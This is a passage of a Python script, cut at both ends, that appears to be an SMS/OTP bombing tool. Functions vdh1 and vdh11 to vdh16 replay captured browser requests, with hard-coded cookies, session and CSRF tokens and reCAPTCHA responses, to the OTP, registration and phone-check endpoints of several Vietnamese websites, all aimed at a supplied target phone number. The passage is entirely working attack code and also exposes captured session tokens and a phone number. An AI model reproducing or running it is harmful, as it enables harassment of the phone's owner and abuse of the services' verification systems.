        '_gcl_aw': 'GCL.1697101744.Cj0KCQjwsp6pBhCfARIsAD3GZuazt3sJTMgpihTlNqZGmdetECgGdRZzfuApgX9v3fB17SmXuxKpNQoaAqNEEALw_wcB',
        '_gat_UA-187725374-1': '1',
        '_ga_ZN0EBP68G5': 'GS1.1.1697101744.1.0.1697101745.59.0.0',
        '_hjSessionUser_2281853': 'eyJpZCI6ImE0MGE4NDY2LWNlNjktNTMyNS04NWJhLTBmMmIyOWY5NzBmMSIsImNyZWF0ZWQiOjE2OTcxMDE3NDUyMDYsImV4aXN0aW5nIjpmYWxzZX0=',
        '_hjIncludedInSessionSample_2281853': '0',
        '_hjSession_2281853': 'eyJpZCI6IjBkMTBhODk4LWM3NDYtNDlhYy05Y2NlLTkxOGQ2ODQwYzZmNSIsImNyZWF0ZWQiOjE2OTcxMDE3NDUyMDksImluU2FtcGxlIjpmYWxzZSwic2Vzc2lvbml6ZXJCZXRhRW5hYmxlZCI6ZmFsc2V9',
        '_ga': 'GA1.2.671353304.1697101730',
        '_gac_UA-187725374-1': '1.1697101748.Cj0KCQjwsp6pBhCfARIsAD3GZuazt3sJTMgpihTlNqZGmdetECgGdRZzfuApgX9v3fB17SmXuxKpNQoaAqNEEALw_wcB',
    }

    headers = {
        'authority': 'lk.takomo.vn',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/json;charset=UTF-8',
        # 'cookie': '_gcl_au=1.1.905385950.1697101730; _gid=GA1.2.820953639.1697101730; _gac_UA-187725374-2=1.1697101730.Cj0KCQjwsp6pBhCfARIsAD3GZuazt3sJTMgpihTlNqZGmdetECgGdRZzfuApgX9v3fB17SmXuxKpNQoaAqNEEALw_wcB; _gat_UA-187725374-2=1; _hjSessionUser_2281843=eyJpZCI6IjAyNDc1MjhhLTlmNDAtNTg1OC1iMzU5LTM2ZmE3NjFiNjdlMiIsImNyZWF0ZWQiOjE2OTcxMDE3MzA1OTAsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjIncludedInSessionSample_2281843=0; _hjSession_2281843=eyJpZCI6ImIxODE1ZDUyLWRmMjMtNDFiMS1hNDU3LWEwNTRkZjFiNGEzNyIsImNyZWF0ZWQiOjE2OTcxMDE3MzA1OTQsImluU2FtcGxlIjpmYWxzZSwic2Vzc2lvbml6ZXJCZXRhRW5hYmxlZCI6dHJ1ZX0=; _hjAbsoluteSessionInProgress=0; _fbp=fb.1.1697101730636.1899941891; _tt_enable_cookie=1; _ttp=xfgnJlSYMTt0ymrTCSc6dSE9yqj; _fw_crm_v=cbb950fc-0b22-4605-c51d-3732b0dba139; _cabinet_key=SFMyNTY.g3QAAAACbQAAABBvdHBfbG9naW5fcGFzc2VkZAAFZmFsc2VtAAAABXBob25lbQAAAAs4NDM3MjY0NTM1Mg.0d_xgR9-7Ji20oQtALNXXLCMsV43PbgD976WM1ojvGs; _ga_ZBQ18M247M=GS1.1.1697101730.1.1.1697101743.47.0.0; _gcl_aw=GCL.1697101744.Cj0KCQjwsp6pBhCfARIsAD3GZuazt3sJTMgpihTlNqZGmdetECgGdRZzfuApgX9v3fB17SmXuxKpNQoaAqNEEALw_wcB; _gat_UA-187725374-1=1; _ga_ZN0EBP68G5=GS1.1.1697101744.1.0.1697101745.59.0.0; _hjSessionUser_2281853=eyJpZCI6ImE0MGE4NDY2LWNlNjktNTMyNS04NWJhLTBmMmIyOWY5NzBmMSIsImNyZWF0ZWQiOjE2OTcxMDE3NDUyMDYsImV4aXN0aW5nIjpmYWxzZX0=; _hjIncludedInSessionSample_2281853=0; _hjSession_2281853=eyJpZCI6IjBkMTBhODk4LWM3NDYtNDlhYy05Y2NlLTkxOGQ2ODQwYzZmNSIsImNyZWF0ZWQiOjE2OTcxMDE3NDUyMDksImluU2FtcGxlIjpmYWxzZSwic2Vzc2lvbml6ZXJCZXRhRW5hYmxlZCI6ZmFsc2V9; _ga=GA1.2.671353304.1697101730; _gac_UA-187725374-1=1.1697101748.Cj0KCQjwsp6pBhCfARIsAD3GZuazt3sJTMgpihTlNqZGmdetECgGdRZzfuApgX9v3fB17SmXuxKpNQoaAqNEEALw_wcB',
        'origin': 'https://lk.takomo.vn',
        'referer': 'https://lk.takomo.vn/?phone=0372645352&amount=10000000&term=30&utm_source=google_search&utm_medium=ThanhBinh-TKM&utm_campaign=google_search_cpc_VH_All_ThanhBinh_1&utm_term=google_search_cpc_VH_All_ThanhBinh_NationalWide_Massive_1_1&utm_content=google_search_cpc_VH_All_ThanhBinh_NationalWide_Massive_TKM___1_1_2&gad=1&gclid=Cj0KCQjwsp6pBhCfARIsAD3GZuazt3sJTMgpihTlNqZGmdetECgGdRZzfuApgX9v3fB17SmXuxKpNQoaAqNEEALw_wcB',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
    }

    json_data = {
        'data': {
            'phone': phone,
            'code': 'resend',
            'channel': 'ivr',
        },
    }

    response = requests.post('https://lk.takomo.vn/api/4/client/otp/send', cookies=cookies, headers=headers, json=json_data)
    if response.status_code == 200:
        print(format_print("*", "vdh1: THÀNH CÔNG!"))
    else:
        print(format_print("x", "vdh1: THẤT BẠI!"))           
        

def vdh11():
    headers = {
        'authority': 'api.swift247.vn',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/json',
        'origin': 'https://app.swift247.vn',
        'referer': 'https://app.swift247.vn/',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
    }

    json_data = {
        'recaptcha_response': '03AFcWeA5SE3-vPGj6pbFcudvrQMf6Rp-0C-AfrEb5cySa0XjatM1sWJiOECUDZhynm7ShFzV4d7Lc7bvqiXZqnscFlZmhdvCXdiNCu8xLLVoX2z-Z68r4I0G4GvKRSYKpp-0nniBgVKoLpvT35OhQYBAfi-M5nAdBzhAl3XBRpeMrb8Vpag8zOyNcOcEE0hIqPvNEtRBxabG_SkkIzC2R4gjUqcyrBZQ-qCNSlmjQ3jAosknN8DdZI3B7IXB0_j0zmLVHXYXt-_sHKwfXfyToNohEaW-YCGc4nUhW1OWqafwekr4xLe3qm4BzMWV9UKdVd3h10MXIZe_8wNgRwZ9eZX2xeqIg6YMFqjUUctUulgGYPlgkoXn7r1VLMaA6ruZ8BzlmXOz_kphfAjs0ddau57uQALWq01qZCVknL0RTux1hRVZ30YmHiInLVxAKOTm94yq4hUyasnt9X1PpWfmD9cBWS_wsuQvZ3Ac8MBqBKq-S-xdwcWjhnbS8qMh7F0IZsz-Fv_OXt59hIBE1NkieJxM1kNMdUNe5M-yqMRQEBPHpHLI4OLCnUKr172hL6iZil5gjL-aI2Vyif1Li_64uwdD9ekAeUSj3dcOvuFH6U2KYD2S6iMkBcMCA_36vVJvPULejiuNpRHHFDabo7m3yYDCmjM8mchzmjrd45whixk1OH06Y3FbULPIEA_rasl2VhbxzyK67-KasOxhU3ZQxUsJh64KxiqvqnCP6wxk9oIyEXfsziPuXpW_09PX_KWxfKUfEAaXOE22gR1k6wFq6o9ZR_6iMZ6dlLIudJ4v_qBgCHN0e2ePEZkUA8ChuMbqkl056hHU7AD71GZ4w4QvcMp_B8bijVJkmt4nIJvCDGGef2LHomsg1D0S2Whq4g7egOQk-WBbafGEVJt5-VWZ6uxPZXmi3h6NOXGiMUdfQb-YmifgN4RveH_Ufyar44QaTND3cnhdUA_erXPnNJ6c45-1WV3xSgJT1mjHc0GlL40nZ2I9VW-Tlt_6a0Z2Y4TZSkQM4ulsCritKZBVdC-V9Rsliwxq8vo6H9T5rTTvHNoICBfkUX_jJtVgzpWgOcJEbHGsQuLHEStRvImxIVZGdEUzDvW8Vf92RhYEdRpKoidY_jMd8WTTodHVfqE7oclUGAxTnJO0mFWKOt3uqRY2Anje6AMIic6ctvKxbck3a8VSBoAxVtbKHIhgHAZA5rHv7JpGVxdKZZy6MkCDMA8zBbvd3zkx9dCcfxlHm0EA4DSfNRtdCE9aOGVKKGLIoHbI9gVDxgLPvef0RVzWJdd8TQ5JIMhKKsWOgrysjTvPDUx9NdhZ-vmtjEpCGTJaGeNZzdjyYCzU03VFx2uckqn8BRpG9xS885L5XeavGW4RLyLEd1hbvjdQ6yfK5t1UcCVF3TGuiOpO_KuD4RMKCZB0KN0yIxisgoh4tSQTfra3WwylcTPqpkWifmkXxmfBtxp0e4apU5sPoK1JW8k5HyywQsYxnY_-3tH6FfHZ_wqar63MNu5WPiq0VTnS1AFxwOxuWDcbxBGynH7g7yz1dx_dey8-XCzGcgqLLo56vuf0g18xxfZ9M50wYEQknIHaiJk0YDhA-RJfKws_8',
        'phone': phone,
    }

    response = requests.post('https://api.swift247.vn/v1/check_phone', headers=headers, json=json_data)
    if response.status_code == 200:
        print(format_print("*", "vdh11: THÀNH CÔNG!"))
    else:
        print(format_print("x", "vdh11: THẤT BẠI!"))   
        

def vdh12():
    headers = {
        'authority': 'api.ahamove.com',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/json;charset=UTF-8',
        'origin': 'https://app.ahamove.com',
        'referer': 'https://app.ahamove.com/',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
    }

    json_data = {
        'mobile': phone,
        'name': 'NGUYEN',
        'email': 'hudhefhhefgye@gmail.com',
        'country_code': 'VN',
        'firebase_sms_auth': 'true',
        'time': 1697123218,
        'checksum': 'DGU+IbOqEJ6K+JBJ7gUZpST5P2eQbiqsguWKVw8WgdvNbCwp0sHa4rq8+v2SE459AabzC1GcadmkFkgAfsUD82rKhJFG9eueCaGaBKQB0Ug52T8/bVWsHFZ5hDvHqNf5Js2XhFu+bFNI/qarh3fSZq2FUDvB3NZ2x42nSM7yyhH993p9gFKGog/bcVgbehVYZ0MH/LUZABiPOt5W7EbIekW75OGA4UbOJkliG0KWOunwORQIswasaVF4PV70IjGkTPPjMfbHj3zHiA1ob6pNf9Djf9qfKI2gp47vXKsXmQAgJrldUeWoq19O+RuUdTrcTlLWTSwR5htUFw+i1FvwdQ==',
    }

    response = requests.post('https://api.ahamove.com/api/v3/public/user/register', headers=headers, json=json_data)
    if response.status_code == 200:
        print(format_print("*", "vdh12: THÀNH CÔNG!"))
    else:
        print(format_print("x", "vdh12: THẤT BẠI!"))   
        
        
def vdh13():
    cookies = {
        '_gid': 'GA1.2.1933755445.1697123307',
        '_gat_UA-230801217-1': '1',
        '_ym_uid': '1697123310666346398',
        '_ym_d': '1697123310',
        '_ga': 'GA1.2.1960886054.1697123307',
        '_ym_isad': '2',
        '_ga_LN0QPGLCB5': 'GS1.2.1697123307.1.1.1697123312.0.0.0',
        '_ym_visorc': 'w',
        '_ga_LBS7YCVKY6': 'GS1.1.1697123307.1.1.1697123313.54.0.0',
        '_fw_crm_v': 'e64f3b50-86d3-4983-c307-9724dd35f021',
    }

    headers = {
        'authority': 'api.thantaioi.vn',
        'accept': '*/*',
        'accept-language': 'vi',
        'content-type': 'application/json',
        # 'cookie': '_gid=GA1.2.1933755445.1697123307; _gat_UA-230801217-1=1; _ym_uid=1697123310666346398; _ym_d=1697123310; _ga=GA1.2.1960886054.1697123307; _ym_isad=2; _ga_LN0QPGLCB5=GS1.2.1697123307.1.1.1697123312.0.0.0; _ym_visorc=w; _ga_LBS7YCVKY6=GS1.1.1697123307.1.1.1697123313.54.0.0; _fw_crm_v=e64f3b50-86d3-4983-c307-9724dd35f021',
        'origin': 'https://thantaioi.vn',
        'referer': 'https://thantaioi.vn/user/registration/reg1',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
    }

    json_data = {
        'full_name': 'VI VAN QUANG',
        'first_name': 'QUANG',
        'last_name': 'VI',
        'middle_name': 'VAN',
        'mobile_phone': phone,
        'target_url': 'https://thantaioi.vn/?utm_source=direct&utm_medium=direct&utm_campaign=direct',
    }

    response = requests.post('https://api.thantaioi.vn/api/user', cookies=cookies, headers=headers, json=json_data)
    if response.status_code == 200:
        print(format_print("*", "vdh13: THÀNH CÔNG!"))
    else:
        print(format_print("x", "vdh13: THẤT BẠI!"))   


def vdh14():
    cookies = {
        'wordpress_google_apps_login': 'ab7c0953e66035e4024a933f9028a39d',
        'PHPSESSID': 'qq82ca2fl29q3nuseg7dnppms4',
        'leadCollection': 'show',
        '_gcl_au': '1.1.633591068.1697123451',
        '__sbref': 'lvfxsblneiicnurlniutdqssqaxhjnlcxhoivxcl',
        '_ga': 'GA1.1.399073766.1697123452',
        '_ga': 'GA1.4.399073766.1697123452',
        '_gid': 'GA1.4.1143546190.1697123452',
        '_fbp': 'fb.2.1697123452056.1279164642',
        '_tt_enable_cookie': '1',
        '_ttp': '5AN9dda0HCel9_mL7W1FwPwyFcD',
        'gaVisitorUuid': 'db6fbfb6-4b40-43ab-a031-ee8104b510d0',
        '__hstc': '162740643.e6fb585f1d045f653646e38487c936ac.1697123459686.1697123459686.1697123459686.1',
        'hubspotutk': 'e6fb585f1d045f653646e38487c936ac',
        '__hssrc': '1',
        '_ga_5658QBW6NK': 'GS1.1.1697123451.1.1.1697123597.18.0.0',
        '_ga_9SNWXSF2JF': 'GS1.1.1697123457.1.1.1697123599.0.0.0',
        '__hssc': '162740643.2.1697123459686',
        '_ga_HHFQLKZ84Q': 'GS1.1.1697123451.1.1.1697123627.53.0.0',
    }

    headers = {
        'authority': 'daihoc.fpt.edu.vn',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        # 'cookie': 'wordpress_google_apps_login=ab7c0953e66035e4024a933f9028a39d; PHPSESSID=qq82ca2fl29q3nuseg7dnppms4; leadCollection=show; _gcl_au=1.1.633591068.1697123451; __sbref=lvfxsblneiicnurlniutdqssqaxhjnlcxhoivxcl; _ga=GA1.1.399073766.1697123452; _ga=GA1.4.399073766.1697123452; _gid=GA1.4.1143546190.1697123452; _fbp=fb.2.1697123452056.1279164642; _tt_enable_cookie=1; _ttp=5AN9dda0HCel9_mL7W1FwPwyFcD; gaVisitorUuid=db6fbfb6-4b40-43ab-a031-ee8104b510d0; __hstc=162740643.e6fb585f1d045f653646e38487c936ac.1697123459686.1697123459686.1697123459686.1; hubspotutk=e6fb585f1d045f653646e38487c936ac; __hssrc=1; _ga_5658QBW6NK=GS1.1.1697123451.1.1.1697123597.18.0.0; _ga_9SNWXSF2JF=GS1.1.1697123457.1.1.1697123599.0.0.0; __hssc=162740643.2.1697123459686; _ga_HHFQLKZ84Q=GS1.1.1697123451.1.1.1697123627.53.0.0',
        'referer': 'https://daihoc.fpt.edu.vn/tuyen-sinh-dh-fpt/',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
    }

    params = {
        'mobile': phone,
    }

    response = requests.get(
        'https://daihoc.fpt.edu.vn/user/xac-thuc-so-dien-thoai.php',
        params=params,
        cookies=cookies,
        headers=headers,
    )
    
    
def vdh15():
    cookies = {
        '_fbp': 'fb.1.1697123737881.73338682',
        '_gid': 'GA1.2.1780838614.1697123738',
        '_gat_gtag_UA_45094808_5': '1',
        'cf_clearance': 'Opgg1JHIUiGBiHxgPVL6fYk4xoqWy3di4T27f8yEpX0-1697123740-0-1-9e45bc70.ad577c4c.c944e390-0.2.1697123740',
        'XSRF-TOKEN': 'eyJpdiI6IlwvXC85RDJaSTdNUzNDNUk1K05MaDhQQT09IiwidmFsdWUiOiJGaG90YmNDaDduNXRhbENxOVZpeGM4SU9cL01qeWgxNEFSanRnNlBcL0FQc1lGWDRZWXJveWpuUnc2WU95WnJySUMiLCJtYWMiOiI4MWI1MzkwMGYxZjFjYWQyY2RiYWY1ODNkMTQ4NmYyODdmYjMxMmNjMDJjZTUyM2NlMGNiYzljMDJmYjAyZDA2In0%3D',
        'laravel_session': 'eyJpdiI6Ikd2cGNWVjl4cXQ4TUtPK3luelVcL2tBPT0iLCJ2YWx1ZSI6IlZGZVpubm9MU1EyQ3NGWWluamF0dW5aa2w3SCtBcHZKbHBybk1KOExzZ2NvWTdMNDZTZjhad1FUc1RFRXZkQ00iLCJtYWMiOiJkYWQwOWE4MzMzODAxM2RlMDYwNDk3MDI4MTUzMzdmNWMxZmQwNzEwNWRiYzNjNzRlM2ZkNmZiMjE4ODQwNjQzIn0%3D',
        '_ga': 'GA1.2.1343231361.1697123738',
        '_ga_D70VFMWRGM': 'GS1.1.1697123737.1.1.1697123750.47.0.0',
        '_gcl_au': '1.1.1005789738.1697123760',
    }

    headers = {
        'authority': 'nhadat.cafeland.vn',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': '_fbp=fb.1.1697123737881.73338682; _gid=GA1.2.1780838614.1697123738; _gat_gtag_UA_45094808_5=1; cf_clearance=Opgg1JHIUiGBiHxgPVL6fYk4xoqWy3di4T27f8yEpX0-1697123740-0-1-9e45bc70.ad577c4c.c944e390-0.2.1697123740; XSRF-TOKEN=eyJpdiI6IlwvXC85RDJaSTdNUzNDNUk1K05MaDhQQT09IiwidmFsdWUiOiJGaG90YmNDaDduNXRhbENxOVZpeGM4SU9cL01qeWgxNEFSanRnNlBcL0FQc1lGWDRZWXJveWpuUnc2WU95WnJySUMiLCJtYWMiOiI4MWI1MzkwMGYxZjFjYWQyY2RiYWY1ODNkMTQ4NmYyODdmYjMxMmNjMDJjZTUyM2NlMGNiYzljMDJmYjAyZDA2In0%3D; laravel_session=eyJpdiI6Ikd2cGNWVjl4cXQ4TUtPK3luelVcL2tBPT0iLCJ2YWx1ZSI6IlZGZVpubm9MU1EyQ3NGWWluamF0dW5aa2w3SCtBcHZKbHBybk1KOExzZ2NvWTdMNDZTZjhad1FUc1RFRXZkQ00iLCJtYWMiOiJkYWQwOWE4MzMzODAxM2RlMDYwNDk3MDI4MTUzMzdmNWMxZmQwNzEwNWRiYzNjNzRlM2ZkNmZiMjE4ODQwNjQzIn0%3D; _ga=GA1.2.1343231361.1697123738; _ga_D70VFMWRGM=GS1.1.1697123737.1.1.1697123750.47.0.0; _gcl_au=1.1.1005789738.1697123760',
        'origin': 'https://nhadat.cafeland.vn',
        'referer': 'https://nhadat.cafeland.vn/dang-ky.html',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phoneNumber': phone,
        '_token': 'ntVFKy0yOfWu1B0vY5akhz7pFXd3VAwssKuVJC6v',
    }

    response = requests.post('https://nhadat.cafeland.vn/register-check-by-phone/', cookies=cookies, headers=headers, data=data)
    
    
def vdh16():
    cookies = {
        '_ttsid': '97a04ce8ad32bf8aaa3c3fabf802a8e935adf2f02e290bca31083a230718783c',
        '_gid': 'GA1.2.118421035.1697123940',
        '_gat_UA-46730129-1': '1',
        '__sts': 'eyJzaWQiOjE2OTcxMjM5NDAzOTYsInR4IjoxNjk3MTIzOTQwMzk2LCJ1cmwiOiJodHRwcyUzQSUyRiUyRnNzby50dW9pdHJlLnZuJTJGbG9naW4iLCJwZXQiOjE2OTcxMjM5NDAzOTYsInNldCI6MTY5NzEyMzk0MDM5Nn0=',
        '__stp': 'eyJ2aXNpdCI6Im5ldyIsInV1aWQiOiI5ZjNjZGMzYS1hZGE5LTQzZDYtYmIyYi0wZDM1NTQ0OWU0ODIifQ==',
        '_ga': 'GA1.1.1077117542.1697123940',
        '__stgeo': 'IjAi',
        '__stbpnenable': 'MQ==',
        '__stdf': 'MA==',
        '_ga_8KQ37P0QJM': 'GS1.1.1697123940.1.1.1697123960.40.0.0',
        'XSRF-TOKEN': 'eyJpdiI6InBhV212MjJKb0tFWC9OMjRJQS9XY2c9PSIsInZhbHVlIjoiWlJtdDRqcWE4Tlo3RnZQajJWVThFTTlXbm1BYkZtZU9VWUtCK1ZTWlpVVHBQNldVVXQ1SHVZMUJVbktYT2NSSVFwSDErNlkyLzk0bmFPMFlHM3l3Znp4a3FkQmFDTnRNdGpaa0oremExWXFzeEVwd09kTndhZlJoZ084MlY2ZE8iLCJtYWMiOiJhZjIxNjVmNjk2MWJmOTdhY2I1NTE2MTBiOTE4NGFlYWFkNTYyYjZjNjdhZGVmNDE5YjhhZjdiMGQ5ZDgxNDlhIiwidGFnIjoiIn0%3D',
        'SSO_SID': 'eyJpdiI6ImxjdXF1NWRRa0U2dkg1UUdJM3Y4Tmc9PSIsInZhbHVlIjoiZEV1TmMwQUtPMDc1Z1Axakl2eTB3QllYcnFCQkhHcjd4OTZESzl6amRqN3FBYVh5bHpZVHlFUEh3L1ZxbHFoYnJwTGxFK1hXSEUxamJQNTh5dFFlSWVmSHJBUE1uQ1ZNVFpsY29uclFwall0dVE4NCtWT042OFowdkJzZTJVZDAiLCJtYWMiOiI1NWU0ZDJhZDZiZmY5NjZiZDVlNWI0ZjQ5MWUwZGY5NDFlZmZiZmQ1MjFjNzg4ZjQyNWZkMGZmODRhNTNjZDRlIiwidGFnIjoiIn0%3D',
    }

    headers = {
        'authority': 'sso.tuoitre.vn',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryslAwQvBBdWAJsg2D',
        # 'cookie': '_ttsid=97a04ce8ad32bf8aaa3c3fabf802a8e935adf2f02e290bca31083a230718783c; _gid=GA1.2.118421035.1697123940; _gat_UA-46730129-1=1; __sts=eyJzaWQiOjE2OTcxMjM5NDAzOTYsInR4IjoxNjk3MTIzOTQwMzk2LCJ1cmwiOiJodHRwcyUzQSUyRiUyRnNzby50dW9pdHJlLnZuJTJGbG9naW4iLCJwZXQiOjE2OTcxMjM5NDAzOTYsInNldCI6MTY5NzEyMzk0MDM5Nn0=; __stp=eyJ2aXNpdCI6Im5ldyIsInV1aWQiOiI5ZjNjZGMzYS1hZGE5LTQzZDYtYmIyYi0wZDM1NTQ0OWU0ODIifQ==; _ga=GA1.1.1077117542.1697123940; __stgeo=IjAi; __stbpnenable=MQ==; __stdf=MA==; _ga_8KQ37P0QJM=GS1.1.1697123940.1.1.1697123960.40.0.0; XSRF-TOKEN=eyJpdiI6InBhV212MjJKb0tFWC9OMjRJQS9XY2c9PSIsInZhbHVlIjoiWlJtdDRqcWE4Tlo3RnZQajJWVThFTTlXbm1BYkZtZU9VWUtCK1ZTWlpVVHBQNldVVXQ1SHVZMUJVbktYT2NSSVFwSDErNlkyLzk0bmFPMFlHM3l3Znp4a3FkQmFDTnRNdGpaa0oremExWXFzeEVwd09kTndhZlJoZ084MlY2ZE8iLCJtYWMiOiJhZjIxNjVmNjk2MWJmOTdhY2I1NTE2MTBiOTE4NGFlYWFkNTYyYjZjNjdhZGVmNDE5YjhhZjdiMGQ5ZDgxNDlhIiwidGFnIjoiIn0%3D; SSO_SID=eyJpdiI6ImxjdXF1NWRRa0U2dkg1UUdJM3Y4Tmc9PSIsInZhbHVlIjoiZEV1TmMwQUtPMDc1Z1Axakl2eTB3QllYcnFCQkhHcjd4OTZESzl6amRqN3FBYVh5bHpZVHlFUEh3L1ZxbHFoYnJwTGxFK1hXSEUxamJQNTh5dFFlSWVmSHJBUE1uQ1ZNVFpsY29uclFwall0dVE4NCtWT042OFowdkJzZTJVZDAiLCJtYWMiOiI1NWU0ZDJhZDZiZmY5NjZiZDVlNWI0ZjQ5MWUwZGY5NDFlZmZiZmQ1MjFjNzg4ZjQyNWZkMGZmODRhNTNjZDRlIiwidGFnIjoiIn0%3D',
        'origin': 'https://sso.tuoitre.vn',
        'referer': 'https://sso.tuoitre.vn/login',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
        'x-csrf-token': '11vElCPAuH1yyvQ7jJSvWPw2wLlhe6bi3QmUavfp',
        'x-requested-with': 'XMLHttpRequest',
        'x-xsrf-token': 'eyJpdiI6InBhV212MjJKb0tFWC9OMjRJQS9XY2c9PSIsInZhbHVlIjoiWlJtdDRqcWE4Tlo3RnZQajJWVThFTTlXbm1BYkZtZU9VWUtCK1ZTWlpVVHBQNldVVXQ1SHVZMUJVbktYT2NSSVFwSDErNlkyLzk0bmFPMFlHM3l3Znp4a3FkQmFDTnRNdGpaa0oremExWXFzeEVwd09kTndhZlJoZ084MlY2ZE8iLCJtYWMiOiJhZjIxNjVmNjk2MWJmOTdhY2I1NTE2MTBiOTE4NGFlYWFkNTYyYjZjNjdhZGVmNDE5YjhhZjdiMGQ5ZDgxNDlhIiwidGFnIjoiIn0=',
    }

    data = '------WebKitFormBoundaryslAwQvBBdWAJsg2D\r\nContent-Disposition: form-data; name="hiddenBackUrl"\r\n\r\nhttp://sso.tuoitre.vn\r\n------WebKitFormBoundaryslAwQvBBdWAJsg2D\r\nContent-Disposition: form-data; name="username"\r\n\r\n{phone}\r\n------WebKitFormBoundaryslAwQvBBdWAJsg2D\r\nContent-Disposition: form-data; name="password"\r\n\r\nhdueggytydg45G\r\n------WebKitFormBoundaryslAwQvBBdWAJsg2D\r\nContent-Disposition: form-data; name="g-recaptcha-response"\r\n\r\n03AFcWeA4lGMabsw-yeX837SKdpf8GBdBmfSS7MirNOYtE7GsXjzyKADswRrAyc7oiY-uHDmggK32ntucgN4Uy-cDHo2ltZCQyqKtmAHT-L4S73x3ngGJGSMnl0OQ4EzWqtzzASV0Bs75Rj7OMBazlWGFZNuIzcPlRAFZVTDNfFk7C2VYtpssqBGNBQ0XjLphHlcWeDfUQn1LuBsNEp7oYiN24touyR1kNf-dcDUa9mzMlMhOJ_wblB_kn8cCpmDJkMecK7jg4U3Kf4WEsQdCOYindIueTlkV606_17PhnuxDJn6XQIxXy7yUBODQ8YhmzLwa0MCemYYfrz8uAFVSG7QdwsuaH2jBuMlEQv9AFfDR-yw9EzWQ7thwsm7jSW_Li2z0TA3H80Mj4QLeHLEHYVQ5kgroCSPlw0akK_uhCG7g-PfXIoa8xdW8hH9UuRqwY6dZsbk7TE1ilj6w6hnV2RTxQhejOWz7s0FuOdfqV7icxeMqGe2swlsUgEc9iFvf7bei1i0i71_CPQ-71Wk88N4-CCGce7mtUBWMjcDK5Fumjkdki3t80_kCuqFYwTNYMDbuIgCM-JVPnx5lDCch6lhhbxMYZNlqPen0jK8FtSUkKYd5GL64oDoiqdShphBR1VQEjSRQaU_Qbsl8j3GlVEcykVpE2IA2JrZBH9nEFEskCwy3b1PnX_MVkowI_XZNxu7a3F8646Ja81CKrlc95fPFDJ01nHafmbbhdY-qpS